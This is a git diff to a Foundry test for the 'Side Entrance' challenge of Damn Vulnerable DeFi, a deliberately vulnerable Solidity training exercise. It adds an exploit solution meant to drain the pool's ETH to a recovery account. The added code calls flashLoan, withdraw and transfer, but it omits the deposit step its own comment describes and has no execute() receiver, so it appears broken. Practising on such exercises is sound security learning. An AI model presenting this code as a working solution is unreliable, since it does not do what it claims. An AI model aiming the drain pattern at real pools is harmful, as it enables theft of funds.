@@ -3,7 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool} from "../security-exercises/damn-vulnerable-defi/side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -42,9 +42,14 @@ contract SideEntranceChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * GOAL => Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.
+     * HOW  => Take a loan, deposit in the pool
      */
     function test_sideEntrance() public checkSolvedByPlayer {
+        
+        pool.flashLoan(ETHER_IN_POOL);
+        pool.withdraw();
+        payable(recovery).transfer(address(player).balance);
         
     }
 
